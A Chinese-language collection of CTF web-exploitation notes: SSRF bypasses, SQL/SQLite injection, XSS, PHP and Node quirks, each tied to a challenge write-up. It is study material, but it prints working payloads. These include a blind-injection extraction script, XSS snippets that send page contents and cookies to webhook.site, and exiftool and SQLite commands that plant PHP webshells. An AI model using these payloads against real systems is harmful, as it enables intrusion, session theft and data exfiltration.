4.  php session反序列化漏洞+SoapClient CRLF注入+SSRF。例题:[bestphp's revenge](../../CTF/BUUCTF/Web/bestphp's%20revenge.md)
5.  call_user_func()函数如果传入的参数是array类型的话，会将数组的成员当做类名和方法。
6.  js原型链污染导致的命令执行。例题:[[GYCTF2020]Ez_Express](../../CTF/BUUCTF/Web/[GYCTF2020]Ez_Express.md)。不仅仅是merge、clone函数会导致原型链污染，同样是express带有的[undefsafe](https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940)函数也会引发此漏洞。例题:[[网鼎杯 2020 青龙组]notes](https://blog.csdn.net/qq_45708109/article/details/108233667)
7.  js大小写特性
- 对于toUpperCase():
> 字符"ı"、"ſ" 经过toUpperCase处理后结果为 "I"、"S"
- 对于toLowerCase():
> 字符"K"经过toLowerCase处理后结果为"k"(这个K不是K)
1.  基础存储型xss获取管理员cookie。例题:[BUU XSS COURSE 1](https://www.cnblogs.com/rabbittt/p/13372401.html)
2.  sql堆叠注入+预处理语句。例题:[supersqli](../../CTF/攻防世界/2级/Web/supersqli.md)
3.  [MySQL注入 利用系统读、写文件](https://www.cnblogs.com/mysticbinary/p/14403017.html)
4.  sql堆叠注入+预处理注入写入shell+[char函数](https://blog.csdn.net/asli33/article/details/7090717)绕过过滤。例题:[[SUCTF 2018]MultiSQL](https://blog.csdn.net/mochu7777777/article/details/105230001)
5.  [nginx配置错误导致的目录穿越漏洞](https://blog.csdn.net/haoren_xhf/article/details/107367766)。
6. [catcat-new](../../CTF/攻防世界/2级/Web/catcat-new.md)
- python存储对象（变量）的位置在堆上，因此可以利用/proc/self/maps+/proc/self/mem读取到变量的内容
- 类似题目：[Home on the Range](https://github.com/M04m1n3/CTF-WRITEUPS/tree/main/utctf/Web/Home%20on%20the%20Range)
- 拓展阅读： https://blog.holbertonschool.com/hack-the-virtual-memory-python-bytes/
7.  [.htaccess的使用技巧](https://blog.csdn.net/solitudi/article/details/116666720)
8.   [php利用伪协议绕过exit](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)。例题:[[EIS 2019]EzPOP](https://blog.csdn.net/TM_1024/article/details/116208390)
9.   php中使用create_function()创建的函数命名规律遵循：%00lambda_%d，其中%d是持续递增的。例题:[[SUCTF 2018]annonymous](https://blog.csdn.net/mochu7777777/article/details/105225558)
10.  [SSRF漏洞利用方式](https://www.anquanke.com/post/id/239994)
11.  thinkphp默认上传路径是/home/index/upload
12.  php中不同的序列化引擎所对应的session的存储方式不相同。

```
php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值
php:存储方式是，键名+竖线+经过serialize()函数序列处理的值
php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值
```

Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。

105. [利用本地DTD文件的xxe](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)。例题:[[GoogleCTF2019 Quals]Bnv](https://syunaht.com/p/1267717976.html)。
106. [xpath注入](https://www.cnblogs.com/backlion/p/8554749.html)。例题:[[NPUCTF2020]ezlogin](https://tyaoo.github.io/2020/05/26/BUUCTF-2/)
107. express的parameterLimit默认为1000,超过后会出现一些unintended behavior，可用于绕过一些内部检查逻辑;根据rfc，header字段可以通过在每一行前面至少加一个SP或HT来扩展到多行。例题:[ez_curl](../../CTF/攻防世界/4级/Web/ez_curl.md)
108. java WEB-INF目录泄露+任意文件读取。例题:[[RoarCTF 2019]Easy Java](../../CTF/BUUCTF/Web/[RoarCTF%202019]Easy%20Java.md)
109. 调用shell执行代码时，被反引号扩起来的内容会先执行，以此可用于绕过一些固定的格式。比如写入的system语句会被包装成json这种情况就可用反引号绕过。例题:[[2020 新春红包题]1](https://www.zhaoj.in/read-6397.html)
110. 如果当前的权限不够，想用已知有权限的账号cat flag，可用：

- printf "GWHTCTF" | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'

这里的账号名为GWHT，密码为GWHTCTF。

111. curl发送自定义数据包（PUT方法，origin，-u选项等）。例题:[[BSidesCF 2020]Hurdles](https://blog.csdn.net/weixin_44037296/article/details/112298411)
112. thinkphp V6.0.x 反序列化链利用。例题:[[安洵杯 2019]iamthinking](https://xz.aliyun.com/t/9546)
113. php hash_hmac函数绕过。`hash_hmac($algo, $data, $key)`：当传入的data为数组时，加密得到的结果固定为NULL。例题:[[羊城杯 2020]Blackcat](https://blog.csdn.net/qq_46263951/article/details/119796671)
114. node js 8.12.0版本的[拆分攻击（CRLF）可造成SSRF](https://xz.aliyun.com/t/2894)+pug模板引擎命令执行。例题:[[GYCTF2020]Node Game](https://blog.csdn.net/cjdgg/article/details/119068329)
115. php7.4的FFI扩展安全问题以及利用（绕过disabled functions）。例题:[[RCTF 2019]Nextphp](https://blog.csdn.net/RABCDXB/article/details/120319633)
116. perl 文件上传+ARGV的利用。例题:[i-got-id-200](../../CTF/攻防世界/6级/Web/i-got-id-200.md)
117. unzip中[软链接](https://blog.csdn.net/weixin_44966641/article/details/119915004)的利用。ln -s是Linux的一种软连接,类似与windows的快捷方式。可以利用压缩了软链接的zip包[任意读取文件](https://xz.aliyun.com/t/2589)。例题:[[SWPU2019]Web3](https://blog.csdn.net/mochu7777777/article/details/105666388)
118. 特殊的flask cookie伪造。与一般的不同，使用get_signing_serializer。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
def index():
    print(session_serializer.dumps("admin"))
index()
#ImFkbWluIg.Y9WDSA.AbIYU50Boq_syWcomulegtw9fnc
```

例题:[[FBCTF2019]Event](https://blog.csdn.net/mochu7777777/article/details/107653920)

119. python利用type函数[动态创建类](http://c.biancheng.net/view/2292.html)。
120. python路径拼接os.path.join()函数当其中一个参数为绝对路径时，前面的参数会被舍弃，利用这个特点可以绕过一些路径限制。例题:[[HFCTF 2021 Final]easyflask](https://blog.csdn.net/LYJ20010728/article/details/117422046)
121. 一段数据以rO0AB开头，基本可以确定这串就是Java序列化base64加密的数据;如果以aced开头，那么是一段Java序列化的16进制。
122. java [JDBCsql注入](https://www.wangan.com/docs/94)+burpsuite java Deserialization Scanner插件+[ysoserial](https://github.com/frohoff/ysoserial)（java反序列化漏洞利用工具）。例题:[[网鼎杯 2020 朱雀组]Think Java](https://blog.csdn.net/RABCDXB/article/details/124003575)
123. 在phpsession里如果在php.ini中设置session.auto_start=On，那么PHP每次处理PHP文件的时候都会自动执行session_start()，但是session.auto_start默认为Off。与Session相关的另一个设置叫[session.upload_progress.enabled](https://xz.aliyun.com/t/9545)，默认为On，在这个选项被打开后，在multipart POST时传入PHP_SESSION_UPLOAD_PROGRESS，PHP会执行session_start()。借此可以绕过一些需要session才能访问的文件的限制，甚至RCE。例题:[[PwnThyBytes 2019]Baby_SQL](https://blog.csdn.net/SopRomeo/article/details/108967248)。
124. node.js早期版本（<8.0)中，沙箱vm2有个特性：当 Buffer 的构造函数传入数字时, 会得到与数字长度一致的一个 Buffer，并且这个 Buffer 是未清零的。8.0 之后的版本可以通过另一个函数 Buffer.allocUnsafe(size) 来获得未清空的内存。一个调用过的变量，一定会存在内存中，也就是说，我们可以使用Buffer函数读取沙箱之外的变量内容，实现沙箱逃逸。例题:[[HITCON 2016]Leaking](https://blog.csdn.net/weixin_44037296/article/details/112387663)
125. 对于SSRF，127.0.0.1无法使用的情况下，可以考虑0.0.0.0。
126. [[网鼎杯 2020 玄武组]SSRFMe](https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/)
- [redis](https://blog.csdn.net/like98k/article/details/106417214) [主从复制](https://www.cnblogs.com/karsa/p/14123957.html) [SSRF](https://xz.aliyun.com/t/5665)（RCE）。主要利用[Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)和[redis-ssrf](https://github.com/xmsec/redis-ssrf)两个工具。
- 绕过ssrf内网ip检测(php libcurl相关，但部分技巧也可以用在绕php之外的ip WAF里)。
  - 利用0.0.0.0:`http://0.0.0.0/`
  - 利用curl和其他库解析url的差异性(已在curl的较新版本被修复)：`http://foo@127.0.0.1:80@www.google.com/` ，https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
  - `http://127.1/hint.php`:ip2long('127.1')会返回false,不过gethostbyname在linux下会返回127.0.0.1，无法绕过。windows下的gethostbyname倒是会返回127.1，可以绕过
  - ip进制绕过。`?url=gopher://0177.0.0x0001:80/_%2547%2545%2554%2520%252f%2568...`
  - `http://127。0。0。1/`：有些curl版本可以
  - ipv6，需要环境支持ipv6
    ```
    http://[::1]/ >>> http://127.0.0.1/
    http://[::]/  >>>  http://0.0.0.0/
    ```
  - `http:///127.0.0.1/`:并不是只有浏览器才会解析这样host为空的畸形url，curl和git也会按照浏览器的方式解析。单纯curl不行，但是php的lib curl行。parse_url解析这样的畸形url会返回false，`$hostname=$url_parse['host'];`会返回null。最后，windows下`gethostbyname(null);`会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，gethostbyname会返回null，绕过ip检测
  - `http://localtest.me`
  - `localh.st`
  - `127.0.0.4`,`http://127.0.0.2`，好像127开头的都是loopback地址
  - 要是允许访问外网的话，可以找点类似tinyurl的网站编码内网ip
127. [[NPUCTF2020]验证🐎](https://blog.csdn.net/hiahiachang/article/details/105756697)。本题的知识点有：
- js中列表，对象等与字符串相加会导致强制类型转换，结果为字符串。可用这个特点绕过一些md5加盐。以及，绕过md5时如果程序启用了json，可以利用json构造对象绕过大部分限制。
- js利用__proto__可从原型链上引出Function和String，Function用于构造函数，String用于得到fromCharCode绕过强制过滤。利用`process.mainModule.require('child_process').execSync('cat /flag')`进行rce，同时还利用了箭头函数。
128. 可以使用以下内容来绕过php的getimagesize()函数获得的图片长宽。
```
#define width 1
#define height 1
```

放头部和末尾都可以。

129. php的mb_strtolower()函数可用于绕过一些过滤。

```php
<?php
var_dump(mb_strtolower('İ')==='i');
//true
?>
```

130. 可绕过php getimagesize()函数的图片马生成[工具](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)。例题:[[CISCN2021 Quals]upload](https://blog.csdn.net/jiangdie666/article/details/116997461)
131. 网页版post上传文件代码。

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

132. [MongoDB](https://zhuanlan.zhihu.com/p/87722764) sql注入。和普通sql注入相似，只是MongoDB还支持js语法，所以有的时候可以直接用js报错爆出字段值。例题:[[2021祥云杯]Package Manager 2021](https://blog.csdn.net/RABCDXB/article/details/124810618)
133. 在正则匹配的时候，如果没有用^$匹配头部或者尾部，就会存在简单的绕过。比如下面的正则：

```js
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

只需要在想填的值前面加上32个任意字符即可绕过。

134. 下面这段代码：

```php
if($count[]=1)
```

表示给\$count[]数组末尾添加一个1，如果添加成功返回1，否则0。这个可以用php的整形溢出绕过。如果数组里已有9223372036854775807个元素，末尾再增添元素就会整形溢出，导致返回false。此为“使用数组整型溢出绕过赋值式“永真”判断”。

135. 攻击 [php-fpm](https://tttang.com/archive/1775/) /pfsockopen绕过 disable_functions+[SUID提权](https://tttang.com/archive/1793/#toc_find-exec)。例题:[[蓝帽杯 2021]One Pointer PHP](https://blog.csdn.net/cosmoslin/article/details/121332240)
136. [利用pearcmd.php从LFI到getshell](https://blog.csdn.net/rfrder/article/details/121042290)。例题:[[HXBCTF 2021]easywill](https://cn-sec.com/archives/1478076.html)。提供p神的另一篇[文章](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)。
137. sql注入利用hex绕过过滤+利用位运算判断flag16进制长度+利用[replace](https://blog.csdn.net/bingguang1993/article/details/80592579)和[case-when-then](https://zhuanlan.zhihu.com/p/165423831)盲注。这题的思路很巧妙，首先是位运算算flag长度：`假设flag的长度为 x,而y 表示 2 的 n 次方,那么 x&y 就能表现出x二进制为1的位置,将这些 y 再进行或运算就可以得到完整的 x 的二进制,也就得到了 flag 的长度`。然后是构造报错语句实现盲注：`在sqlite3中,abs函数有一个整数溢出的报错,如果abs的参数是-9223372036854775808就会报错,同样如果是正数也会报错`。又因为引号被过滤，无法直接输入a，b这类16进制数字，靠trim数据库里已有的数据的16进制来得到所有的16进制字符，最后更是利用abs的性质报错实现盲注。

```python
# coding: utf-8
import binascii
import requests
URL = 'http://85ede6a8-f6ba-463f-996d-499f800d6cf0.node4.buuoj.cn:81/vote.php'
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

题目:[[HarekazeCTF2019]Sqlite Voting](https://blog.csdn.net/qq_46263951/article/details/119727922)

138. [uuid v1](https://versprite.com/blog/universally-unique-identifiers/)是可以预测的,因此用v1版本的uuid做身份认证有被爆破预测uuid的风险。在js里，node ID和clock sequence如下给出：

```js
var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
//node=0x67696e6b6f69
//clockseq=0b10101001100100=0x2a64,第一位会根据UUID variant变化
```

python里则是：

```python
UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
```

例题:[uuid hell](https://ctftime.org/writeup/36173)

139. Mercurial SCM .hg文件夹泄露。Mercurial SCM也有一个和git类似的库管理命令：hg。注意它在遇见特殊字符时会转义，但是转义符是"_"。意味着一个名字包含一个下划线的文件最终文件名里会有两个下划线。例题:[my-chemical-romance](https://ctftime.org/writeup/36174)
140. xss绕过[HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)和`default-src 'none'; script-src 'unsafe-inline'`[csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)设置。前者让我们无法document.cookie盗取admin cookie值，后者允许内嵌式js脚本，但不允许以任何形式加载文件，包括服务器自身的。意味着无法以任何常见的形式发送请求，比如常用的fetch。替代方式是以form的形式发送POST。

```html
<form method="post" id="theForm" action="/flag"></form> <!-- action填要访问的网址 -->
<script> 
    document.getElementById('theForm').submit();
</script>
```

如果要打开的目标网页会重定向，可以考虑在代码中加入打开另一个窗口的操作，使用setTimeout函数保持当前网页脚本的运行，在打开的窗口中获取到flag。例如:

```html
<form method="post" id="theForm" action="/flag" target='bruh'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','bruh');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);
</script>
```

例题:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)。能成功的原因在于：根据[MDN文档](https://developer.mozilla.org/en-US/docs/Web/API/Window/open)，window.open会在目标的环境（context）打开一个空白窗口，意味着同域内的内容可用js访问。

该题的另外一种[做法](https://hackmd.io/@lamchcl/r1zQkbvpj#cryptohill-easy)思路差不多，不过用了两个report：

```html
<script>
setTimeout(()=>{location="https://webhook.site/ac78b7a4-1e35-4fd9-ac25-83a47c4ecf09?a="+encodeURIComponent(window.opener.document.documentElement.outerHTML)},200)
</script>
```

```html
<form action="/flag" method=POST></form>
<script>
window.open("/report/11da7ab4-821d-4f2f-8ea1-e829d74a6366", target="_blank")
document.forms[0].submit();
</script>
```

后者是提交给admin bot的report。发现主要思路还是利用form访问flag然后利用打开的另一个窗口将内容带出来。

如果非要在开启HttpOnly的情况下获取cookie，在php驱动的网站下，尝试找phpinfo界面，里面有个HTTP_COOKIE字段。xss让bot访问phpinfo界面，找HTTP_COOKIE字段就能拿到cookie了。脚本参考：

```html
<script>
fetch('/phpinfo.php', {
method: 'POST'})
.then((response) => response.text())
.then((data) => fetch('webhook之类网址', {
method: 'POST',body:btoa(data)}));
</script>
```

141. js中的type juggling。审查源码时，可能会发现服务器期望输入变量是字符串等简单类型，但如果没有对变量做严格过滤，或是使用了express的`express.urlencoded()`（其extended属性默认接受复杂类型），就可以尝试攻击，比如改成数组之类的。例题:[queue up!](https://github.com/sambrow/ctf-writeups/blob/main/2023/la-ctf/queue-up.md)
142. 当xss代码以innerHTML形式插入时，浏览器不会执行这样的代码。可以用`<img/src=1 onerror=function()>`或`<iframe>`替代。`<iframe>`有个srcdoc属性，里面的内容会被当作html执行。这种解法可在[这里](https://hackmd.io/@lamchcl/r1zQkbvpj#webhptla)找到。
143. js的多行注释/\*\*/可用于绕过滤和跨多行执行xss，不过要注意，多行注释不要用在js关键字中间，例如`win/**/dow`。因为js会把/\*\*/解释为空格，window就失效了。例题:[hptla](https://blog.jaquiez.dev/Blog/LACTF2023/#hptla)
144. typescript+ssrf。例题:[[2021祥云杯]secrets_of_admin](https://blog.csdn.net/weixin_46081055/article/details/123959252)。此题的知识点：

- 下面这个路由：

```ts
router.get('/api/files/:id'...)
```

当我们访问`http://xxx.com/api/files/aaa`时，aaa就是id的值。
- 利用\<img\>标签的src属性触发ssrf。\<img\>标签会加载src指定的资源，如果我们往src里输入想要ssrf的目标网址，自然就是用当前服务器的身份构造了一次ssrf了。其他有类似属性的标签也可以这么用。当然，对应网址需要被加载，这题里面触发场景为html转pdf时加载图片资源。
- `content.includes('<')`可以用数组类型的`content[]`绕过。
- http-pdf 任意文件读取漏洞。可以用XHR（XMLHttpRequest）任意文件读取。
- ts开放在8888端口。
- 当看到`filename   VARCHAR(255) NOT NULL UNIQUE`的数据库配置,说明filename这个字段值不能重复。这道题的解决方法是构造垃圾目录（flag已有，构造./flag，由于路径字符串拼接，没有影响）。

145. mysql查询特性。

- 不分大小写/多余空格。下面的代码：

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if ($username=="admin" && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`http://xxx.com?username=Admin&password=admin`来绕过。就算填写的用户名是Admin，依然能查询出来admin的数据。另一种绕过方式是`http://xxx.com?username=admin &password=admin`，多了个空格。
- 默认将unicode字符转为字母。

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if (preg_match("/admin/i",$username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //查询逻辑，用户名和密码为admin/admin，查得出来就给flag
}
```

可以用`?username=Àdmin&password=admin`绕过。这里使用的`À`会被标准化成A，不影响查询结果，但可以绕过正则。另外，这道题还告诉我`$_SERVER['REMOTE_ADDR']!=="127.0.0.1"`是不可绕过的。

146. 上传图片的xss挑战可以考虑上传svg类型（svg图片存在`<script>`标签，可以插入xss代码）。
147. 如果服务器返回的报文没有`Content-Type`字段，浏览器就需要强制解析返回的内容，借此可以执行一些恶意代码（比如上传图片，但是内容是xss。如果此时服务器不返回images/png的`Content-Type`，浏览器就要解析图片，执行xss）。对于apache服务器，当文件名不存在后缀时，它不会返回`Content-Type`字段。这些文件名有`.png`,`.jpg`甚至`...png`（任意数量的点）。
148. [DomPurify.sanitize](https://cloud.tencent.com/developer/article/1825938)过滤下的xss。sanitize只允许创建`[div,a,span,p]`html标签和属性`[style,id,name,href]`，这种情况下在没有用户交互的前提下是不可能成功执行有用的xss的。不过既然开放了一些标签，可以考虑[dom clobbering](https://ljdd520.github.io/2020/03/14/DOM-Clobbering%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/)。例如在插入`<p id='test'>`这个标签后，在js里可以通过`test`或者`window.test`来获取到它。这意味着：

```js
if(user.isAdmin){
    //期望执行逻辑
}
```

这样的代码可以通过创建`"<a/id='user'><a/id='user'/name=isAdmin>"@g.com`来覆盖原本的`user.isAdmin`，使其进入if语句（这里payload的`/`和`@g.com`是因为题目要求输入内容为邮箱，加入`/`代替空格使其符合邮箱格式）。注意无需给其赋值，让它存在并覆盖原来的就行。

145. 绕过getimagesize（将js代码插入有效图片）+绕过csp `script-src 'self'`。可直接使用这篇[文章](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)的poc图片，hex editor打开图片找到`alert`代码即可将其换为任意其他js代码。
146. php的include函数包含木马时，木马文件的后缀名无需是php，jpg等也行，只要图片文件里包含php木马代码。可以考虑用exiftool把木马写到注释里：`exiftool img.jpg -Comment="<?=system(\$_GET[0]);die();?>"`。
147. php [realpath](https://www.php.net/manual/zh/function.realpath.php)函数在参数路径开头为`file:///`时，会返回空字符串。
148. sqlite利用查询语句写入php shell文件。要注意ATTACH DATABASE的路径需要可读可写。

```sql
ATTACH DATABASE '/var/www/html/socengexpasdf.php' AS socengexpasdf;
CREATE TABLE socengexpasdf.pwn (dataz text);
INSERT INTO socengexpasdf.pwn VALUES ('<? system($_GET["cmd"]); ?>');
```

[ATTACH DATABASE](https://www.runoob.com/sqlite/sqlite-attach-database.html)附加数据库`/var/www/html/socengexpasdf.php`，因为该文件不存在，故会在/var/www/html/下创建一个socengexpasdf.php，别名为socengexpasdf，下面的语句都是基于别名来操作的。[CREATE TABLE](https://www.runoob.com/sqlite/sqlite-create-table.html)在刚才指定的socengexpasdf数据库下创建一个名为pwn的表，(dataz text)指定数据类型。[INSERT INTO](https://www.runoob.com/sqlite/sqlite-insert.html)插入shell代码。

149. 根据查询结果重定向不同的url的设计加上不安全的cookie设置（SameSite: None;Secure: false:）可能有[XS-leak](https://xsleaks.dev/)。例题:[secrets](../../CTF/HackTM%20CTF/Web/secrets.md)，此题的预期解为[Cross-Origin Redirects and CSP Violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)，非预期解则是利用了chrome的url大小最大为2MB的限制。
150. 利用sql [like](https://www.runoob.com/sql/sql-like.html)语句爆破code+利用BeautifulSoup与浏览器解析html的区别绕过xss过滤+利用www.youtube.com的[JSONP](https://www.zhihu.com/question/19966531)绕过CSP限制。例题:[Crocodilu](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/crocodilu)。题目要求激活用户需要输入code，但code是4位随机数字且一个邮箱账号因为[redis](https://zhuanlan.zhihu.com/p/51608696)的限制只允许爆破一次。漏洞代码为下面的sql语句：

```sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
```

且邮箱验证代码使用了python的re.match：

- If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return None if the string does not match the pattern; note that this is different from a zero-length match. 

允许我们在正确格式的邮箱末尾添加sql里的通配符%。只要我们在输入邮箱时基于原来的邮箱不停在末尾添加%，redis不会将其识别为同一个邮箱，但sql查询时会，成功绕过一个邮箱账号只能爆破一次的难题。

关于BeautifulSoup，对于下面的结构：

```html
<!--><script>alert(1)</script>-->
```

BeautifulSoup会将其解析为注释，但浏览器会将其解析为script，成功执行代码。

151. 利用jQuery load函数的特性执行xss。例题:[Hades](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/hades)。此题的关键代码在于：

```js
$('#ajax-load').load('/ajax/articles?cat=news');
```

其中news可控。如果我们构造paylaod:`/ajax/articles?cat=asdf"x="`，服务器会返回：

```html
<noscript>
    If you can't see anything, you have to enable javascript
    <img src="/images/error.jpg" alt="selected category asdf"x="" />
</noscript>
```

给img注入了一个属性，但是因为[<noscript>](https://www.runoob.com/tags/tag-noscript.html)标签的存在，无法执行xss。于是根据jQuery[文档](https://api.jquery.com/load/)，利用load函数的提取标签特性成功盗取cookie。

152. flask session密钥爆破工具：[flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)。例题:[Chocholates](https://eszfrigyes.com/2023/02/ctf-writeup-chocolates-mhsctf2023/)
153. `*`
154. [Tor](https://zh.wikipedia.org/zh-cn/Tor)可以访问以onion结尾的网站。例题:[Hash Browns](https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4)
155. onERC721Received回调函数可能触发[Re-Entrancy Attack](https://steemit.com/cn/@chenlocus/reentrancy)（重入攻击，特征为先操作后改状态）+js/python释放合约。例题:[Dragon Slayer](../../CTF/HackTM%20CTF/Web/Dragon%20Slayer.md)。
156. [zero-trust](https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/web/zero-trust/README.md)
- AES-256-[GCM](https://zh.wikipedia.org/wiki/%E4%BC%BD%E7%BD%97%E7%93%A6/%E8%AE%A1%E6%95%B0%E5%99%A8%E6%A8%A1%E5%BC%8F)(带认证的AES加密)正确使用可防止密文篡改，此题演示了一种错误使用方式：使用decipher.setAuthTag()后却不使用decipher.final()（参考Node.js的[Crypto](https://nodejs.org/api/crypto.html#decipherfinaloutputencoding)模块）。setAuthTag()函数设置一个tag，在最后使用final函数时如果没有提供一样的tag或者密文被篡改，就会报错。
- AES-256-GCM按128位分块。这题已知部分密文对应的明文，就可以用明文异或密文获取部分加密时的key。此时就能用这小部分key篡改密文了。
157. `*`
158. [sqlite注入](https://juejin.cn/post/7016991806759911454)。sqlite的语法大部分和sql差不多，不过注释符是`--`,`;`,`/*`。
159. JWT不仅可以被存储在Cookie里，也可以被存在浏览器的Local Storage里。
160. [RPS](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/RPS/writeup.md)（另一版本[wp](https://sichej.it/writeups/rps-writeup/)）
- [plain input(text) fields](https://stackoverflow.com/questions/56843356/plain-text-field-validation-for-protection-against-xss-attack)路由可能会成为xss的潜在攻击对象。或者说，当题目明确提示要成为admin+有机器人/管理员会查看xxx等提示时，就要考虑xss了。管理员要查看的xxx就是需要特别关注的地方。
- 同样的xss更改邮箱（可以换成任何其他题目的路由）payload，既可以用fetch：

```js
<script>
    fetch("https://rps.ctf.pragyan.org/email", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
        credentials: "include",
        body: "newEmail=youremail%40gmail.com",
    });
</script>
```

也可以用XMLHttpRequest：

```js
<script> const xhr = new XMLHttpRequest(); xhr.open('POST', '{URL}/email');xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify({newEmail: "your_email_here"})); </script>
```

161. [Quotify](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Quotify/writeup.md)
- JSONP路由callback的利用
- [mXss](https://security.stackexchange.com/questions/46836/what-is-mutation-xss-mxss)（mutaion Xss，突变xss）+DOM Clobbering

介绍mXss的[视频](https://www.youtube.com/watch?v=Haum9UpIQzU)(16:00开始)。内容可以简述为这篇[帖子](https://juejin.cn/post/6844903571578699790)的内容。这道题使用的mXss可能更像[这种](https://xz.aliyun.com/t/6413)。这道题需要利用JSONP调用一个函数，但这个函数有一些限制。因为输入的内容会被放入div标签中，于是用mXss使dom变异，多出来的结构刚好可以提供给DOM Clobbering

mxss cheatsheet: https://sonarsource.github.io/mxss-cheatsheet

162. [Proxy It](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ProxyIt/writeup.md)。利用[request smuggling](https://portswigger.net/web-security/request-smuggling)（请求走私）访问被禁止的路径。
163. [Pages of Turmoil](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/PagesOfTurmoil/writeup.md)。
- 利用Chrome的[Text Fragments](https://developer.mozilla.org/en-US/docs/Web/Text_fragments)控制页面高亮、翻页到特定位置。
- MongoDB [ObjectId](https://www.mongodb.com/docs/manual/reference/method/ObjectId/)格式。
164. [Lerdof's Records](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/Lerdof's%20Records/writeup.md)
- php的strcmp()只会对比null字节之前的字符，但strlen函数计算字符串长度是包含null字节

补充：当strcmp的参数是数组时，会抛出warning且返回true，故可绕过。例如下方代码：

```php
<?php
    $flag="";
    try {
        if (isset($_GET['username']) && isset($_GET['password'])) {
            if (strcmp($_GET['username'], $flag)==0 && strcmp($_GET['password'], $flag)==0)
                echo $flag;
            els
                echo "Invalid username or password";
        }
    } catch (Throwable $th) {
        echo $flag;
    }
?>
```

